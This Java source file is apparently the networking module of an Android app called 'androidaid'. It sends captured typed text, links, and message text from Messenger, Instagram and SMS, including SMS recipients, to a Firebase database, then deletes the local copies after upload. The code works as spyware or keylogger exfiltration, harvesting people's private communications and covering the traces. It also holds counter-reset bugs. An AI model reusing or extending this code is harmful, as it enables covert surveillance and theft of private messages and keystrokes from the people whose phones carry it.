package androidaid.android.com.androidaid.networking;

import android.location.Location;
import android.support.annotation.NonNull;

import com.google.android.gms.common.api.GoogleApiClient;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;

import androidaid.android.com.androidaid.core.ExtraConversationData;
import androidaid.android.com.androidaid.core.TextBuilder;
import androidaid.android.com.androidaid.program_flow.Constants;
import androidaid.android.com.androidaid.storage.InternalStorageFileData;
import androidaid.android.com.androidaid.storage.InternalStorageFileDataGeneral;
import androidaid.android.com.androidaid.storage.InternalStorageManager;
import androidaid.android.com.androidaid.utilities.StringUtils;

public class DatabaseNetworking {
    //these are used to control when to delete file contents
    public  static int isfd_messenger_length;
    public static int isfd_instagram_length;
    public static int isfd_sms_length;
    public static int isfd_general_length;

    public static int databaseWritesCounter = 0;

    private static final FirebaseDatabase database = FirebaseDatabase.getInstance();

    /**
     * Stores the specified text at the specified time in the location of the database specified by databaseLocation
     * @param text
     * @param time
     * @param databaseLocation
     */
    public static void storeText(String text, String time, final String databaseLocation) {
        //System.out.println("[sproc32.DatabaseNetworking.storeText]: Storing text '" + text + "' to location " + databaseLocation);

        DatabaseReference fieldText = database.getReference(databaseLocation);
        fieldText.child(time).setValue(text).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
                //System.out.println("[sproc32.storeText]: Text storing operation complete!");

                databaseWritesCounter++;
                deleteFileContentsIfNeccessary(databaseLocation);
            }
        });
    }

    public static void storeText(String text, String time, ExtraConversationData ecd, final String databaseLocation) {
        if(null==text) return;
        
        //System.out.println("[sproc32.DatabaseNetworking.storeText]: Storing text" + text + " with extra text data to location " + databaseLocation);

        DatabaseReference fieldText = database.getReference(databaseLocation);
        fieldText.child(time).child(Constants.DATABASE_SUBNODE_TYPED_TEXT).setValue(text).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
                //System.out.println("[sproc32.storeText]: Text storing operation complete!");

                databaseWritesCounter++;
                deleteFileContentsIfNeccessary(databaseLocation);
            }
        });

        //store the extra text as the child of text
        storeExtraConversationData(ecd, time, databaseLocation);
    }

    public static void storeText(String text, String time, String recipient, String extraText, final String databaseLocation) {
        ExtraConversationData ecd = new ExtraConversationData(recipient, extraText);
        storeText(text, time, ecd, databaseLocation);
    }

    private static void storeExtraConversationData(ExtraConversationData ecd, String time, String databaseLocation) {
        StringUtils.eliminateForbidden(ecd.getExtraText(), Constants.DATABASE_FORBIDDEN_FIELD_TEXT_VALUES);

        //System.out.println("[sproc32.DatabaseNetworking.storeExtraConversationData]: Storing extra conversation data. Recipient = " + ecd.getRecipient() + " | extra text = " + ecd.getExtraText());
        DatabaseReference extraText = database.getReference(databaseLocation);
        extraText.child(time).child(Constants.DATABASE_SUBNODE_EXTRA_CONVERSATION_DATA).setValue(ecd).addOnCompleteListener(new OnCompleteListener<Void>() {
                @Override
                public void onComplete(@NonNull Task<Void> task) {
                    //System.out.println("[sproc32.storeExtraConversationData]: Extra conversation data storing complete");

                    //todo: setup delete in storage if necessary??
                }
            });
    }

    /**
     * Stores the current text in textbuilder and then erases it so more can be stored under node Constants.DATABASE_NODE_GENERAL_TEXT
     * @param time
     */
    public static void storeTypedText(String time) {
        DatabaseReference fieldText = database.getReference(Constants.DATABASE_NODE_GENERAL_TEXT);
        fieldText.child(time).setValue(TextBuilder.getText()).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
                //System.out.println("[sproc32.storeText]: Complete! Added this text: " + TextBuilder.getText());
                TextBuilder.clearText();
            }
        });
    }

    public static void storeLink(final String link, String dateAndTime, String databaseLocation) {
        //System.out.println("[sproc32.networking.DatabaseNetworking.storeLink]: Storing link " + link + " to database.");
        DatabaseReference databaseReference = database.getReference(databaseLocation);
        databaseReference.child(dateAndTime).setValue(link).addOnCompleteListener(new OnCompleteListener<Void>() {
            @Override
            public void onComplete(@NonNull Task<Void> task) {
                //System.out.println("[sproc32.networking.DatbaseNetworking.storeLink]: Link " + link + " has been successfully stored");
            }
        });
    }

    public static void storeInternalStorageText(ArrayList<ArrayList<? extends InternalStorageFileData>> allFileData) {
        //System.out.println("[sproc32.networking.DatabaseNetworking]: Storing internal storage text on the database.");

        for (int i = 0; i<allFileData.size(); i++) {
            ArrayList<? extends InternalStorageFileData> currentFileData = allFileData.get(i);

            switch(i) {
                case 0:
                    //this data is from messenger
                    //System.out.println("[sproc32.networking.DatabaseNetworking]: Sending messenger file data to messenger node.");
                    ArrayList<InternalStorageFileData> isfd_messenger = (ArrayList<InternalStorageFileData>) currentFileData;

                    isfd_messenger_length = isfd_messenger.size();

                    for (InternalStorageFileData currentData : isfd_messenger) {
                        //System.out.println("[sproc32.networking.DatabaseNetworking]: Storing data set: " + currentData.getText() + " | " + currentData.getDate());
                        storeText(currentData.getText(), currentData.getDate(), Constants.DATABASE_NODE_FIELD_TEXT_MESSENGER);
                    }
                    break;

                case 1:
                    //this data is from instagram
                    //System.out.println("[sproc32.networking.DatabaseNetworking]: Sending instagram file data to instagram node.");
                    ArrayList<InternalStorageFileData> isfd_instagram = (ArrayList<InternalStorageFileData>) currentFileData;

                    isfd_instagram_length = isfd_instagram.size();

                    for(InternalStorageFileData currentData : isfd_instagram) {
                        //System.out.println("[sproc32.networking.DatabaseNetworking]: Storing data set: " + currentData.getText() + " | " + currentData.getDate());
                        storeText(currentData.getText(), currentData.getDate(), Constants.DATABASE_NODE_FIELD_TEXT_INSTAGRAM);
                    }
                    break;
                case 2:
                    //this data is from sms
                    //System.out.println("[sproc32.networking.DatabaseNetworking]: Sending sms file data to sms node.");
                    ArrayList<InternalStorageFileData> isfd_sms = (ArrayList<InternalStorageFileData>) currentFileData;

                    isfd_sms_length = isfd_sms.size();

                    for(InternalStorageFileData currentData : isfd_sms) {
                        //System.out.println("[sproc32.networking.DatabaseNetworking]: Storing data set: " + currentData.getText() + " | " + currentData.getDate());
                        storeText(currentData.getText(), currentData.getDate(), currentData.getRecipient(), currentData.getExtraText(), Constants.DATABASE_NODE_FIELD_TEXT_SMS);
                    }
                    break;
                case 3:
                    //this data is general text data
                    ArrayList<InternalStorageFileDataGeneral> isfdg = (ArrayList<InternalStorageFileDataGeneral>) currentFileData;

                    isfd_general_length = isfdg.size();

                    for (InternalStorageFileDataGeneral currentData : isfdg) {
                        //todo: provide method implementation to store general text on the database!!!
                    }

            }
        }
    }

    private static void deleteFileContentsIfNeccessary(String databaseLocation) {
        switch(databaseLocation) {
            case Constants.DATABASE_NODE_FIELD_TEXT_MESSENGER:
                //System.out.println("[sproc32.storeText]: isfd_messenger_length = " + isfd_messenger_length + " | databaseWritesCounter = " + databaseWritesCounter);

                if (isfd_messenger_length == databaseWritesCounter) {
                    //System.out.println("[sproc32.storeText]: All of the text for " + Constants.STORAGE_FIELD_TEXT_MESSENGER + " has been sent to the database. Deleting file contents.");
                    //if the length of the messenger array items is equal to the amount of database writes, all of the data has been sent to the datbase, therefore delete messenger file data
                    InternalStorageManager.deleteFileContents(Constants.STORAGE_FIELD_TEXT_MESSENGER);

                    //reset
                    isfd_messenger_length = 0;
                    databaseWritesCounter = 0;
                }
                break;
            case Constants.DATABASE_NODE_FIELD_TEXT_INSTAGRAM:
                //System.out.println("[sproc32.storeText]: isfd_instagram_length = " + isfd_instagram_length + " | databaseWritesCounter = " + databaseWritesCounter);

                if (isfd_instagram_length == databaseWritesCounter) {
                    //System.out.println("[sproc32.storeText]: All of the text for " + Constants.STORAGE_FIELD_TEXT_INSTAGRAM + " has been sent to the database. Deleting file contents.");
                    //if the length of the messenger array items is equal to the amount of database writes, all of the data has been sent to the datbase, therefore delete messenger file data
                    InternalStorageManager.deleteFileContents(Constants.STORAGE_FIELD_TEXT_INSTAGRAM);

                    //reset
                    isfd_messenger_length = 0;
                    databaseWritesCounter = 0;
                }
                break;
            case Constants.DATABASE_NODE_FIELD_TEXT_SMS:
                //System.out.println("[sproc32.storeText]: isfd_sms_length = " + isfd_sms_length + " | databaseWritesCounter = " + databaseWritesCounter);

                if (isfd_sms_length == databaseWritesCounter) {
                    //System.out.println("[sproc32.storeText]: All of the text for " + Constants.STORAGE_FIELD_TEXT_SMS + " has been sent to the database. Deleting file contents.");
                    //if the length of the messenger array items is equal to the amount of database writes, all of the data has been sent to the datbase, therefore delete messenger file data
                    InternalStorageManager.deleteFileContents(Constants.STORAGE_FIELD_TEXT_SMS);

                    //reset
                    isfd_messenger_length = 0;
                    databaseWritesCounter = 0;
                }
                break;
            case Constants.DATABASE_NODE_GENERAL_TEXT:
                //System.out.println("[sproc32.storeText]: isfd_messenger_length = " + isfd_general_length + " | databaseWritesCounter = " + databaseWritesCounter);

                if (isfd_general_length == databaseWritesCounter) {
                    //System.out.println("[sproc32.storeText]: All of the text for " + Constants.STORAGE_GENERAL_TEXT_FILE_LOCATION + " has been sent to the database. Deleting file contents.");
                    //if the length of the messenger array items is equal to the amount of database writes, all of the data has been sent to the datbase, therefore delete messenger file data
                    InternalStorageManager.deleteFileContents(Constants.STORAGE_GENERAL_TEXT_FILE_LOCATION);

                    //reset
                    isfd_messenger_length = 0;
                    databaseWritesCounter = 0;
                }
                break;
        }
    }
}
